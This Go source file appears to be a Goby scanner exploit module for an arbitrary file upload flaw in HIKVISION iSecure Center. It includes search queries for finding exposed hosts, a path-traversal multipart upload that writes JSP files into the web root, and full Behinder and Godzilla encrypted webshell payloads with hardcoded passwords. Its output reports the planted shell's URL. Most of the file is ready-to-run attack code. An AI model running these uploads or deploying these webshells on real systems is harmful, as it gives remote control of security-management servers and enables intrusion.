package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "HIKVISION iSecure Center /lm/api/files files file upload vulnerability",
    "Description": "<p>HiKVISION integrated security management platform iSecure Center provides open capabilities in video, all-in-one card, parking lot, face application, event service, alarm detection, temperature measurement application, etc.</p><p>HiKVISION integrated security management platform has an arbitrary file upload vulnerability. An attacker can use this vulnerability to upload arbitrary files on the server side, execute code, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "HIKVISION-iSecure-Center",
    "Homepage": "https://www.hikvision.com/",
    "DisclosureDate": "2023-08-10",
    "PostTime": "2023-11-17",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "body=\"/portal/ui/static/favicon.ico\" || header=\"EPORTAL_JSESSIONID\" || banner=\"EPORTAL_JSESSIONID\" || body=\"/portal/ui/static/\" || body=\"/nginxService/v1/download/InstallRootCert.exe\" || body=\"/modules/sys/license_upload.jsp\"",
    "GobyQuery": "body=\"/portal/ui/static/favicon.ico\" || header=\"EPORTAL_JSESSIONID\" || banner=\"EPORTAL_JSESSIONID\" || body=\"/portal/ui/static/\" || body=\"/nginxService/v1/download/InstallRootCert.exe\" || body=\"/modules/sys/license_upload.jsp\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to upload files, execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.hikvision.com/\">https://www.hikvision.com/</a></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "godzilla,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.jsp",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\");%>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "HIKVISION iSecure Center /lm/api/files 文件上传漏洞",
            "Product": "HIKVISION-iSecure-Center",
            "Description": "<p>HiKVISION 综合安防管理平台 iSecure Center 提供了视频、一卡通、停车场、人脸应用、事件服务、报警检测、测温应用等方面的能力开放。</p><p>HiKVISION 综合安防管理平台存在任意文件上传漏洞，攻击者可通过该漏洞在服务器端上传任意文件，执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.hikvision.com/\">https://www.hikvision.com/</a></p><p>临时修复方案：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端上传任意文件，执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "HIKVISION iSecure Center /lm/api/files files file upload vulnerability",
            "Product": "HIKVISION-iSecure-Center",
            "Description": "<p>HiKVISION integrated security management platform iSecure Center provides open capabilities in video, all-in-one card, parking lot, face application, event service, alarm detection, temperature measurement application, etc.</p><p>HiKVISION integrated security management platform has an arbitrary file upload vulnerability. An attacker can use this vulnerability to upload arbitrary files on the server side, execute code, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.hikvision.com/\">https://www.hikvision.com/</a></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to upload files, execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10872"
}`
	uploadFileZXOCUJAOWSE := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewPostRequestConfig("/lm/api/files;.css")
		getRequestConfig.VerifyTls = false
		getRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=9caeb96f0c27d24edb38762bab230c65")
		getRequestConfig.Data = "--9caeb96f0c27d24edb38762bab230c65\r\n" + //
			"Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../tomcat85linux64.1/webapps/els/static/" + filename + "\"\r\n\r\n" +
			content + "\r\n--9caeb96f0c27d24edb38762bab230c65--"
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)

	}
	checkFileExistsXCOIAUEASD := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/els/static/" + filename)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		getRequestConfig.Timeout = 15
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			filename := goutils.RandomHexString(5) + ".jsp"
			content := goutils.RandomHexString(6)
			resp, _ := uploadFileZXOCUJAOWSE(hostInfo, filename, content)
			if resp != nil && resp.Utf8Html != "" && strings.Contains(resp.Utf8Html, `filename`) {
				checkResponse, checkError := checkFileExistsXCOIAUEASD(hostInfo, filename)
				return checkError == nil && checkResponse != nil && checkResponse.StatusCode == 200 && strings.Contains(checkResponse.Utf8Html, content)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var content string
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			filename := goutils.RandomHexString(16) + ".jsp"
			if attackType == "behinder" {
				// /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
				content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
			} else if attackType == "godzilla" {
				// 哥斯拉 pass key
				content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}
%>`
			} else if attackType == "custom" {
				content = goutils.B2S(stepLogs.Params["content"])
				filename = goutils.B2S(stepLogs.Params["filename"])
			} else {
				expResult.Output = `未知的利用方式`
				return expResult
			}
			resp, err := uploadFileZXOCUJAOWSE(expResult.HostInfo, filename, content)
			if !(err == nil && resp.Utf8Html != "" && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `filename`)) {
				expResult.Output = "文件上传失败！"
				return expResult
			}
			checkResponse, checkError := checkFileExistsXCOIAUEASD(expResult.HostInfo, filename)
			if !(checkError == nil && checkResponse != nil && (checkResponse.StatusCode == 200 || checkResponse.StatusCode == 500)) {
				expResult.Output = "文件上传失败！"
				return expResult
			}
			expResult.Success = true
			expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/els/static/" + filename + "\n"
			if attackType == "behinder" {
				expResult.Output += "Password: rebeyond\n"
				expResult.Output += "WebShell tool: Behinder v3.0\n"
			} else if attackType == "godzilla" {
				expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
				expResult.Output += "WebShell tool: Godzilla v4.1\n"
			}
			expResult.Output += "Webshell type: jsp"
			return expResult
		},
	))
}